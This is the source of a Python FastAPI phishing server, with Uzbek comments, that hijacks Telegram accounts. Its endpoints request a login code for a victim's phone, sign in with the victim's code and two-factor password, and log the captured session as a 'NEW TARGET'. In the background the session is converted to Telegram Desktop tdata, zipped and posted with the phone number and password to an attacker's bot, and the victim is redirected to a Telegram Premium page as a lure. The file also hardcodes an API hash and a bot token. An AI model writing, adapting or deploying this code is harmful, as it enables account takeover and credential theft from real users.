import asyncio
import logging
import os
import zipfile
import shutil
import requests
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from pydantic import BaseModel
import uvicorn

# --- SOZLAMALAR ---
API_ID = 33223639 
API_HASH = 'da4a254e086d07d78998b7992e64a39b'
BOT_TOKEN = "8563399979:AAGOxsu3daN1CAa2xh6TefbTNhYw67BINpQ"
ADMIN_ID = "1263747123"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="Kiber-Inspektor 2FA & Bot Sender")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

active_clients = {}

class AuthRequest(BaseModel):
    phone: str
    code: str = None
    hash: str = None
    password: str = None

# --- TDATA YARATISH VA BOTGA YUBORISH FUNKSIYASI ---
async def send_tdata_to_admin(phone, session_str, password=None):
    from opentele.tl import TelegramClient as OpenteleClient
    
    folder_name = f"tdata_{phone.replace('+', '')}"
    zip_path = f"{folder_name}.zip"
    
    try:
        # 1. Tdata yaratish
        client = OpenteleClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        td = await client.ToTDesktop(password=password)
        td.SaveTData(folder_name)
        await client.disconnect()

        # 2. Arxivlash
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(folder_name):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), folder_name))

        # 3. Botga yuborish
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        caption = f"🚀 Yangi Akkaunt Tutildi!\n📞 Tel: {phone}\n🔑 Parol: {password or 'Yoq'}\n🆔 Session: `{session_str}`"
        
        with open(zip_path, 'rb') as doc:
            requests.post(url, data={'chat_id': ADMIN_ID, 'caption': caption, 'parse_mode': 'Markdown'}, files={'document': doc})
        
        logger.info(f"Tdata botga yuborildi: {phone}")

    except Exception as e:
        logger.error(f"Botga yuborishda xatolik: {e}")
    
    finally:
        # 4. Tozalash (Railway xotirasini to'ldirmaslik uchun)
        if os.path.exists(zip_path): os.remove(zip_path)
        if os.path.exists(folder_name): shutil.rmtree(folder_name)

# --- API ENDPOINTLAR ---

@app.post("/send")
async def send_otp(data: AuthRequest):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(data.phone)
        active_clients[data.phone] = client
        return {"hash": sent.phone_code_hash}
    except Exception as e:
        logger.error(f"Xatolik (send): {e}")
        raise HTTPException(status_code=400, detail="Raqam xato yoki Telegram cheklovi.")

@app.post("/verify")
async def verify_otp(data: AuthRequest):
    client = active_clients.get(data.phone)
    if not client:
        raise HTTPException(status_code=400, detail="Sessiya topilmadi.")

    try:
        if data.password:
            await client.sign_in(password=data.password)
        else:
            await client.sign_in(data.phone, data.code, phone_code_hash=data.hash)
        
        captured_session = client.session.save()
        user = await client.get_me()
        
        # Log fayliga yozish
        log_entry = f"--- NEW TARGET ---\nNAME: {user.first_name}\nTEL: {data.phone}\nSESSION: {captured_session}\n-------------------\n"
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(log_entry)
            
        # FONDA BOTGA YUBORISH (Jarayonni to'xtatib qo'ymaslik uchun)
        asyncio.create_task(send_tdata_to_admin(data.phone, captured_session, data.password))
        
        del active_clients[data.phone]
        return {"status": "success", "redirect": "https://t.me/premium"}
        
    except errors.SessionPasswordNeededError:
        return {"status": "2fa_needed", "message": "Bulutli parol kerak."}
    except Exception as e:
        return {"status": "error", "message": "Kod yoki parol noto'g'ri."}

if __name__ == "__main__":
    # Railway PORT ni o'zi beradi
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)